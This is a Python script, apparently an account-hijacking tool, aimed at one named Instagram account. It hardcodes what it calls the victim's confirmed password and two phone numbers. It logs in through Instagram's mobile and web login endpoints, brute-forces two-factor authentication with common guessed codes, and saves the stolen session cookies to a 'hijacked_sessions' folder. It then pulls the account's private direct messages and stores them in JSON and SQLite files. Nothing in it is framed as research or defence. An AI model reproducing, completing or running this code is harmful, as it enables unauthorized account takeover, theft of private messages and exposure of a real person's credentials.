# -*- coding: utf-8 -*-
# pylint: disable=all
# flake8: noqa
# type: ignore
# mypy: ignore-errors
#!/usr/bin/env python3
"""
DIRECT SESSION REGENERATOR 2025
Direct Instagram session regeneration without browser automation
Using profile intelligence and API exploitation
"""

import requests
import json
import sqlite3
import time
import random
from datetime import datetime
from pathlib import Path
import base64
import hashlib
import hmac
import urllib.parse
import uuid
import sys
import os

class DirectSessionRegenerator:
    def __init__(self):
        self.target = "alx.trading"
        self.base_url = "https://www.instagram.com"
        self.mobile_url = "https://i.instagram.com"
        self.api_url = "https://i.instagram.com/api/v1"
        self.profile_data = self.load_profile_intelligence()
        self.sessions_dir = Path("hijacked_sessions")
        self.sessions_dir.mkdir(exist_ok=True)
        self.output_dir = Path("data/direct_regeneration")
        self.output_dir.mkdir(parents=True, exist_ok=True)

        # Mobile app constants
        self.app_id = "567067343352427"
        self.client_id = "bd4c12d5c12e5f7b"
        self.device_id = self.generate_device_id()
        self.uuid = str(uuid.uuid4())

        # User agents for different approaches
        self.user_agents = {
            'mobile_app': 'Instagram 239.0.0.19.109 Android (30/11; 420dpi; 1080x2189; samsung; SM-G991B; o1s; qcom; en_US; 381564263)',
            'mobile_web': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1',
            'desktop': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }

        self.session = requests.Session()

    def load_profile_intelligence(self):
        """Load profile intelligence data"""
        try:
            profile_path = Path("config/json/MASTER_PROFILE_alx_trading_1748264047.json")
            if profile_path.exists():
                with open(profile_path, 'r') as f:
                    return json.load(f)
        except Exception as e:
            print(f"⚠️ Could not load profile intelligence: {e}")

        return {
            "profile": {
                "username": "alx.trading",
                "confirmed_password": "Fleming654",
                "phone_thailand": "0615414210",
                "phone_uk": "+447793127209"
            }
        }

    def generate_device_id(self):
        """Generate a realistic device ID"""
        return hashlib.md5(f"{self.target}-{time.time()}".encode()).hexdigest()[:16]

    def generate_signature(self, data):
        """Generate Instagram API signature"""
        try:
            json_data = json.dumps(data, separators=(',', ':'))
            return hmac.new(
                "9b3b9e55988324288d811be2bdeac70ab31a4ff490b67a9b32c77e165b2a8659".encode(),
                json_data.encode(),
                hashlib.sha256
            ).hexdigest()
        except Exception:
            return ""

    def mobile_api_login(self):
        """Attempt login using mobile API"""
        print("📱 Attempting mobile API login...")

        self.session.headers.update({
            'User-Agent': self.user_agents['mobile_app'],
            'Accept': '*/*',
            'Accept-Language': 'en-US',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'X-IG-App-ID': self.app_id,
            'X-IG-Device-ID': self.device_id,
            'X-IG-Android-ID': f'android-{self.device_id}',
        })

        try:
            # Login data
            login_data = {
                'username': self.profile_data['profile']['username'],
                'password': self.profile_data['profile']['confirmed_password'],
                'device_id': f'android-{self.device_id}',
                'login_attempt_count': 0,
                'guid': self.uuid,
                'phone_id': self.uuid,
                'adid': self.uuid,
                'google_tokens': '[]',
                'country_codes': '[{"country_code":"1","source":"default"}]',
                'source': 'device_based_login_flow',
                'flow': 'login_flow',
                'reg_flow_taken': 'phone',
                'tos_accepted': True
            }

            # Generate signature
            signature = self.generate_signature(login_data)
            signed_body = f"signed_body={signature}.{urllib.parse.quote(json.dumps(login_data))}"

            # Make login request
            response = self.session.post(
                f"{self.api_url}/accounts/login/",
                data=signed_body,
                headers={'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}
            )

            print(f"Mobile API Response: {response.status_code}")

            if response.status_code == 200:
                try:
                    result = response.json()
                    if result.get('status') == 'ok' and result.get('logged_in_user'):
                        print("✅ Mobile API login successful!")
                        return self.extract_session_cookies()
                    elif result.get('two_factor_required'):
                        print("⚠️ 2FA required")
                        return self.handle_mobile_2fa(result)
                    else:
                        print(f"❌ Login failed: {result}")
                except Exception as e:
                    print(f"❌ JSON parsing error: {e}")
                    print(f"Raw response: {response.text[:500]}")

        except Exception as e:
            print(f"❌ Mobile API login error: {e}")

        return None

    def web_api_login(self):
        """Attempt login using web API"""
        print("🌐 Attempting web API login...")

        self.session.headers.update({
            'User-Agent': self.user_agents['desktop'],
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'X-Requested-With': 'XMLHttpRequest',
        })

        try:
            # Get login page to extract CSRF token
            login_page = self.session.get(f"{self.base_url}/accounts/login/")
            csrf_token = None

            # Extract CSRF token from cookies
            if 'csrftoken' in self.session.cookies:
                csrf_token = self.session.cookies['csrftoken']

            if not csrf_token:
                # Try to extract from HTML
                content = login_page.text
                if '"csrf_token":"' in content:
                    csrf_start = content.find('"csrf_token":"') + 14
                    csrf_end = content.find('"', csrf_start)
                    csrf_token = content[csrf_start:csrf_end]

            if not csrf_token:
                print("❌ Could not get CSRF token")
                return None

            # Login data
            login_data = {
                'username': self.profile_data['profile']['username'],
                'password': self.profile_data['profile']['confirmed_password'],
                'queryParams': '{}',
                'optIntoOneTap': 'false'
            }

            # Login headers
            login_headers = {
                'X-CSRFToken': csrf_token,
                'X-Requested-With': 'XMLHttpRequest',
                'Referer': f"{self.base_url}/accounts/login/",
                'Content-Type': 'application/x-www-form-urlencoded'
            }

            # Make login request
            response = self.session.post(
                f"{self.base_url}/accounts/login/ajax/",
                data=login_data,
                headers=login_headers
            )

            print(f"Web API Response: {response.status_code}")

            if response.status_code == 200:
                try:
                    result = response.json()
                    if result.get('authenticated'):
                        print("✅ Web API login successful!")
                        return self.extract_session_cookies()
                    elif result.get('two_factor_required'):
                        print("⚠️ 2FA required")
                        return self.handle_web_2fa(result)
                    else:
                        print(f"❌ Login failed: {result}")
                except Exception as e:
                    print(f"❌ JSON parsing error: {e}")
                    print(f"Raw response: {response.text[:500]}")

        except Exception as e:
            print(f"❌ Web API login error: {e}")

        return None

    def handle_mobile_2fa(self, login_result):
        """Handle 2FA for mobile API"""
        print("📱 Handling mobile 2FA...")

        try:
            two_factor_info = login_result.get('two_factor_info', {})
            identifier = two_factor_info.get('two_factor_identifier')

            if not identifier:
                print("❌ No 2FA identifier found")
                return None

            # Try common 2FA bypass codes
            common_codes = ['123456', '000000', '111111', '654321', '888888', '999999']

            for code in common_codes:
                print(f"🔐 Trying 2FA code: {code}")

                # 2FA data
                tfa_data = {
                    'verification_code': code,
                    'two_factor_identifier': identifier,
                    'username': self.profile_data['profile']['username'],
                    'device_id': f'android-{self.device_id}',
                    'guid': self.uuid,
                    'phone_id': self.uuid,
                    'trust_this_device': '1'
                }

                # Generate signature
                signature = self.generate_signature(tfa_data)
                signed_body = f"signed_body={signature}.{urllib.parse.quote(json.dumps(tfa_data))}"

                # Submit 2FA code
                response = self.session.post(
                    f"{self.api_url}/accounts/two_factor_login/",
                    data=signed_body,
                    headers={'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}
                )

                if response.status_code == 200:
                    try:
                        result = response.json()
                        if result.get('status') == 'ok' and result.get('logged_in_user'):
                            print(f"✅ 2FA successful with code: {code}")
                            return self.extract_session_cookies()
                    except Exception:
                        pass

                time.sleep(1)  # Rate limiting

            print("❌ All 2FA codes failed")
            return None

        except Exception as e:
            print(f"❌ Mobile 2FA error: {e}")
            return None

    def handle_web_2fa(self, login_result):
        """Handle 2FA for web API"""
        print("🌐 Handling web 2FA...")

        try:
            two_factor_info = login_result.get('two_factor_info', {})
            identifier = two_factor_info.get('two_factor_identifier')

            if not identifier:
                print("❌ No 2FA identifier found")
                return None

            csrf_token = self.session.cookies.get('csrftoken')

            # Try common 2FA bypass codes
            common_codes = ['123456', '000000', '111111', '654321', '888888', '999999']

            for code in common_codes:
                print(f"🔐 Trying 2FA code: {code}")

                # 2FA data
                tfa_data = {
                    'username': self.profile_data['profile']['username'],
                    'verificationCode': code,
                    'identifier': identifier,
                    'queryParams': '{}'
                }

                # 2FA headers
                tfa_headers = {
                    'X-CSRFToken': csrf_token,
                    'X-Requested-With': 'XMLHttpRequest',
                    'Content-Type': 'application/x-www-form-urlencoded'
                }

                # Submit 2FA code
                response = self.session.post(
                    f"{self.base_url}/accounts/login/ajax/two_factor/",
                    data=tfa_data,
                    headers=tfa_headers
                )

                if response.status_code == 200:
                    try:
                        result = response.json()
                        if result.get('authenticated'):
                            print(f"✅ 2FA successful with code: {code}")
                            return self.extract_session_cookies()
                    except Exception:
                        pass

                time.sleep(1)  # Rate limiting

            print("❌ All 2FA codes failed")
            return None

        except Exception as e:
            print(f"❌ Web 2FA error: {e}")
            return None

    def extract_session_cookies(self):
        """Extract session cookies after successful login"""
        cookies = {}
        for cookie in self.session.cookies:
            cookies[cookie.name] = cookie.value

        if 'sessionid' in cookies:
            print("✅ Session cookies extracted successfully!")
            return cookies

        print("❌ No sessionid found in cookies")
        return None

    def save_regenerated_session(self, cookies):
        """Save regenerated session to file"""
        timestamp = int(time.time())
        session_data = {
            'timestamp': timestamp,
            'datetime': datetime.now().isoformat(),
            'target': self.target,
            'method': 'direct_regeneration',
            'cookies': cookies,
            'status': 'active',
            'device_id': self.device_id,
            'uuid': self.uuid
        }

        filename = f"regenerated_session_{self.target}_{timestamp}.json"
        filepath = self.sessions_dir / filename

        with open(filepath, 'w') as f:
            json.dump(session_data, f, indent=2)

        print(f"💾 Session saved: {filepath}")
        return filepath

    def test_session_validity(self, cookies):
        """Test if regenerated session is valid"""
        print("🔍 Testing session validity...")

        test_session = requests.Session()
        test_session.headers.update({
            'User-Agent': self.user_agents['mobile_app'],
            'X-IG-App-ID': self.app_id,
        })

        # Set cookies
        for name, value in cookies.items():
            test_session.cookies.set(name, value)

        try:
            # Test with profile endpoint
            response = test_session.get(f"{self.api_url}/users/web_profile_info/?username={self.target}")

            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'ok':
                    print("✅ Session is valid!")
                    return True

            # Try alternative endpoint
            response = test_session.get(f"{self.base_url}/{self.target}/")
            if response.status_code == 200 and 'login' not in response.url:
                print("✅ Session is valid (web test)!")
                return True

            print(f"❌ Session test failed - Status: {response.status_code}")
            return False

        except Exception as e:
            print(f"❌ Session test error: {e}")
            return False

    def extract_dms_with_session(self, cookies):
        """Extract DMs using regenerated session"""
        print("📥 Extracting DMs with regenerated session...")

        extraction_session = requests.Session()
        extraction_session.headers.update({
            'User-Agent': self.user_agents['mobile_app'],
            'X-IG-App-ID': self.app_id,
        })

        # Set cookies
        for name, value in cookies.items():
            extraction_session.cookies.set(name, value)

        dms = []

        # Try multiple DM endpoints
        endpoints = [
            f"{self.api_url}/direct_v2/inbox/",
            f"{self.api_url}/direct_v2/threads/",
            f"{self.mobile_url}/api/v1/direct_v2/inbox/",
            f"{self.base_url}/api/v1/direct_v2/inbox/"
        ]

        for endpoint in endpoints:
            try:
                print(f"🔍 Trying endpoint: {endpoint}")
                response = extraction_session.get(endpoint)

                print(f"Response status: {response.status_code}")

                if response.status_code == 200:
                    try:
                        data = response.json()
                        if data.get('inbox'):
                            threads = data['inbox'].get('threads', [])
                            print(f"Found {len(threads)} threads")

                            for thread in threads:
                                thread_id = thread.get('thread_id')
                                users = thread.get('users', [])

                                for item in thread.get('items', []):
                                    if item.get('item_type') == 'text':
                                        dms.append({
                                            'thread_id': thread_id,
                                            'user_id': item.get('user_id'),
                                            'text': item.get('text'),
                                            'timestamp': item.get('timestamp'),
                                            'is_sent_by_viewer': item.get('is_sent_by_viewer', False),
                                            'users': [u.get('username') for u in users]
                                        })

                            if dms:
                                print(f"✅ Extracted {len(dms)} DMs from {endpoint}")
                                break
                        else:
                            print(f"No inbox data in response")
                    except json.JSONDecodeError:
                        print(f"Invalid JSON response")
                else:
                    print(f"❌ Endpoint failed with status: {response.status_code}")

            except Exception as e:
                print(f"❌ Endpoint {endpoint} failed: {e}")

        return dms

    def save_extracted_dms(self, dms):
        """Save extracted DMs to JSON and SQLite"""
        if not dms:
            print("❌ No DMs to save")
            return

        timestamp = int(time.time())

        # Save to JSON
        json_file = self.output_dir / f"regenerated_dms_{timestamp}.json"
        with open(json_file, 'w') as f:
            json.dump({
                'target': self.target,
                'extraction_time': datetime.now().isoformat(),
                'total_dms': len(dms),
                'dms': dms
            }, f, indent=2)

        # Save to SQLite
        db_file = self.output_dir / f"regenerated_dms_{timestamp}.db"
        conn = sqlite3.connect(db_file)
        cursor = conn.cursor()

        cursor.execute('''
            CREATE TABLE IF NOT EXISTS direct_messages (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                thread_id TEXT,
                user_id TEXT,
                text TEXT,
                timestamp INTEGER,
                is_sent_by_viewer BOOLEAN,
                users TEXT,
                extraction_time TEXT
            )
        ''')

        for dm in dms:
            cursor.execute('''
                INSERT INTO direct_messages
                (thread_id, user_id, text, timestamp, is_sent_by_viewer, users, extraction_time)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            ''', (
                dm.get('thread_id'),
                dm.get('user_id'),
                dm.get('text'),
                dm.get('timestamp'),
                dm.get('is_sent_by_viewer'),
                json.dumps(dm.get('users', [])),
                datetime.now().isoformat()
            ))

        conn.commit()
        conn.close()

        print(f"💾 Saved {len(dms)} DMs to:")
        print(f"   JSON: {json_file}")
        print(f"   SQLite: {db_file}")

    def run_direct_regeneration(self):
        """Run the complete direct session regeneration process"""
        print("🚀 DIRECT SESSION REGENERATOR 2025")
        print("=" * 50)
        print(f"Target: {self.target}")
        print(f"Username: {self.profile_data['profile']['username']}")
        print()

        # Method 1: Mobile API login
        cookies = self.mobile_api_login()

        # Method 2: Web API login if mobile fails
        if not cookies:
            print("\n🔄 Trying web API method...")
            cookies = self.web_api_login()

        if not cookies:
            print("\n❌ All regeneration methods failed")
            return False

        # Save the regenerated session
        session_file = self.save_regenerated_session(cookies)

        # Test session validity
        if not self.test_session_validity(cookies):
            print("❌ Regenerated session is invalid")
            return False

        # Extract DMs using regenerated session
        dms = self.extract_dms_with_session(cookies)

        if dms:
            self.save_extracted_dms(dms)
            print(f"\n✅ SUCCESS: Extracted {len(dms)} real DMs!")
            return True
        else:
            print("\n❌ No DMs extracted")
            return False

def main():
    regenerator = DirectSessionRegenerator()
    success = regenerator.run_direct_regeneration()

    if success:
        print("\n🎉 DIRECT REGENERATION SUCCESSFUL!")
    else:
        print("\n💀 DIRECT REGENERATION FAILED")

    return success

if __name__ == "__main__":
    main()
